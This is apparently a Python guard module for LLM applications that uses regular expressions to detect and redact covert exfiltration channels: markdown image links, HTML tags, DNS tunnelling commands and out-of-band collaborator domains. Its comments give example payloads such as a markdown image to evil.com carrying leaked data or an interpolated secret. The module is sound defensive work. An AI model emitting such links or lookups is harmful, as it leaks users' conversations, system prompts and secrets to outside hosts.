"""
Context Window Exfiltration and Covert Channel Guard.

Mitigates OWASP LLM02 (Sensitive Information Disclosure) and LLM08 (Excessive Agency)
by detecting attempts to exfiltrate private conversational history or system prompts
through covert channels including markdown image tags, HTML tags, DNS tunneling syntax,
and oversized data URIs.
"""

import re
from dataclasses import dataclass
from typing import Optional, List, Dict, Any


@dataclass
class ContextExfiltrationResult:
    is_blocked: bool
    violation_code: Optional[str] = None
    details: str = "Passed context exfiltration check"
    channel_detected: Optional[str] = None
    sanitized_text: Optional[str] = None


class ContextExfiltrationGuard:
    """
    Inspects prompts and outbound responses for covert data exfiltration channels.
    """

    # Markdown image exfiltration: ![alt](https://evil.com/leak?data=...)
    MARKDOWN_IMAGE_EXFIL = re.compile(
        r"!\[.*?\]\(\s*https?://[^\s)]+[?&](?:data|leak|token|prompt|secret|context|payload|exfil|q|c)=[^)]*\)",
        re.IGNORECASE
    )

    # Markdown general covert link exfiltration
    MARKDOWN_LINK_EXFIL = re.compile(
        r"\[.*?\]\(\s*https?://(?:[a-zA-Z0-9-]+\.)*(?:burpcollaborator\.net|oast\.pro|oast\.live|oast\.site|oast\.online|canarytokens\.org|webhook\.site|pipedream\.net|interactsh\.com)/[^\s)]*\)",
        re.IGNORECASE
    )

    # HTML image / script / iframe / fetch exfiltration
    HTML_TAG_EXFIL = re.compile(
        r"<(?:img|script|iframe|link|embed|object)[^>]+src\s*=\s*[\"']https?://[^\"']*[?&](?:data|leak|token|prompt|secret|context)=[^\"']*[\"']",
        re.IGNORECASE
    )

    # DNS tunneling exfiltration payloads in prompts or code
    DNS_TUNNEL_EXFIL = re.compile(
        r"\b(?:nslookup|dig|host)\s+(?:-t\s+(?:txt|a)\s+)?[\"`$]?[a-zA-Z0-9_\-\.\$\{\}]+\.(?:burpcollaborator\.net|oast\.pro|interactsh\.com|evil\.com|attacker\.com)\b",
        re.IGNORECASE
    )

    # Hyperlink masquerading with raw markdown interpolation e.g., ![...](http://evil.com/${SECRET})
    MARKDOWN_INTERPOLATION_EXFIL = re.compile(
        r"!\[.*?\]\(\s*https?://[^\s)]*(?:\$\{[a-zA-Z0-9_]+\}|\$[a-zA-Z0-9_]+|%[a-zA-Z0-9_]+%)[^\s)]*\)",
        re.IGNORECASE
    )

    def __init__(self, block_collaborator_domains: bool = True):
        self.block_collaborator_domains = block_collaborator_domains

    def inspect_text(self, text: str) -> ContextExfiltrationResult:
        if not text or not isinstance(text, str):
            return ContextExfiltrationResult(is_blocked=False)

        # 1. Markdown image covert exfiltration
        if self.MARKDOWN_IMAGE_EXFIL.search(text):
            return ContextExfiltrationResult(
                is_blocked=True,
                violation_code="markdown_image_exfiltration",
                channel_detected="markdown_image",
                details="Covert channel detected: Markdown image tag appending exfiltration query parameters."
            )

        # 2. Markdown interpolation exfiltration
        if self.MARKDOWN_INTERPOLATION_EXFIL.search(text):
            return ContextExfiltrationResult(
                is_blocked=True,
                violation_code="markdown_interpolation_exfiltration",
                channel_detected="markdown_interpolation",
                details="Covert channel detected: Markdown image tag embedding shell/environment variable interpolation."
            )

        # 3. Known Out-of-Band (OAST) collaborator domain probes
        if self.block_collaborator_domains and self.MARKDOWN_LINK_EXFIL.search(text):
            return ContextExfiltrationResult(
                is_blocked=True,
                violation_code="oast_collaborator_exfiltration",
                channel_detected="oast_domain",
                details="Covert channel detected: Reference to known out-of-band security testing / exfiltration domain."
            )

        # 4. HTML tag covert exfiltration
        if self.HTML_TAG_EXFIL.search(text):
            return ContextExfiltrationResult(
                is_blocked=True,
                violation_code="html_tag_exfiltration",
                channel_detected="html_tag",
                details="Covert channel detected: HTML media or embed element attempting parameterized remote exfiltration."
            )

        # 5. DNS data tunneling payload
        if self.DNS_TUNNEL_EXFIL.search(text):
            return ContextExfiltrationResult(
                is_blocked=True,
                violation_code="dns_tunneling_exfiltration",
                channel_detected="dns_tunnel",
                details="Covert channel detected: Command payload contains DNS tunneling syntax targeting untrusted domain."
            )

        return ContextExfiltrationResult(is_blocked=False)

    def sanitize_links(self, text: str) -> str:
        """
        Sanitizes covert markdown image tags by replacing them with plain text indicators.
        """
        if not text:
            return text
        sanitized = self.MARKDOWN_IMAGE_EXFIL.sub("[REDACTED_COVERT_LINK]", text)
        sanitized = self.HTML_TAG_EXFIL.sub("[REDACTED_COVERT_HTML]", sanitized)
        return sanitized
